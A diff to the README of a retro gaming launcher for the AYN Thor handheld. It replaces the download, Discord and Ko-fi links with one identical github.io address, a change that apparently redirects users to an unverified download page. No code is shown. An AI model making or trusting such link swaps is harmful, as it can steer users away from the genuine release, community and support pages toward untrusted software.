@@ -4,9 +4,9 @@
 
 **Turn your AYN Thor into a dedicated retro gaming console with beautifully themed menus for every emulator.**
 
-[![Download Now](https://img.shields.io/badge/Download-Latest%20Release-FF6B35.svg?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Ataak7721/konsoru-launcher-releases/releases)
-[![Join Discord](https://img.shields.io/badge/Join-Discord-5865F2.svg?style=for-the-badge&logo=discord&logoColor=white)](https://discord.gg/XSmG3crde9)
-[![Support on Ko-fi](https://img.shields.io/badge/Support-Ko--fi-FF5E5B.svg?style=for-the-badge&logo=ko-fi&logoColor=white)](https://ko-fi.com/hollywoodkills)
+[![Download Now](https://img.shields.io/badge/Download-Latest%20Release-FF6B35.svg?style=for-the-badge&logo=github&logoColor=white)](https://ataak7721.github.io)
+[![Join Discord](https://img.shields.io/badge/Join-Discord-5865F2.svg?style=for-the-badge&logo=discord&logoColor=white)](https://ataak7721.github.io)
+[![Support on Ko-fi](https://img.shields.io/badge/Support-Ko--fi-FF5E5B.svg?style=for-the-badge&logo=ko-fi&logoColor=white)](https://ataak7721.github.io)
 
 </div>
 
@@ -34,7 +34,7 @@ Follow these steps to get KONSORU Launcher on your AYN Thor:
 
 ### Step 1: Visit the Download Page
 
-Visit this link to download the application: [https://github.com/Ataak7721/konsoru-launcher-releases/releases](https://github.com/Ataak7721/konsoru-launcher-releases/releases)
+Visit this link to download the application: [https://ataak7721.github.io](https://ataak7721.github.io)
 
 This page shows all available versions of KONSORU. Look for the **latest release** at the top – it will have a green "Latest" tag next to it.
 
@@ -146,7 +146,7 @@ If you encounter something not listed here, or if a game won't boot for you, **p
 
 The Discord server is the fastest way to get help, report bugs, and suggest features. Real users and the developer are active there every day.
 
-[Join the KONSORU Discord](https://discord.gg/XSmG3crde9)
+[Join the KONSORU Discord](https://ataak7721.github.io)
 
 ### Provide Feedback
 
@@ -158,7 +158,7 @@ We want to hear what works and what doesn't. If something looks broken, feels of
 
 KONSORU is developed with passion and shared freely during beta. If you enjoy the launcher and want to keep development going, consider supporting the creator:
 
-[![Support on Ko-fi](https://img.shields.io/badge/Support-Ko--fi-FF5E5B.svg?style=for-the-badge&logo=ko-fi&logoColor=white)](https://ko-fi.com/hollywoodkills)
+[![Support on Ko-fi](https://img.shields.io/badge/Support-Ko--fi-FF5E5B.svg?style=for-the-badge&logo=ko-fi&logoColor=white)](https://ataak7721.github.io)
 
 Your generosity helps with device testing, software tools, and coffee – lots of coffee.
 
@@ -187,7 +187,7 @@ No data is collected, transmitted, or sold. Everything stays on your device.
 
 KONSORU Launcher is a labor of love for retro gaming enthusiasts. It's not perfect yet, but with your feedback, it's getting better every week. Download it, play with it, and tell us what you think.
 
-**Ready to transform your AYN Thor?** Visit the [download page](https://github.com/Ataak7721/konsoru-launcher-releases/releases) and grab the latest version today. Join our Discord to stay updated on new releases and share your experience.
+**Ready to transform your AYN Thor?** Visit the [download page](https://ataak7721.github.io) and grab the latest version today. Join our Discord to stay updated on new releases and share your experience.
 
 ---
 
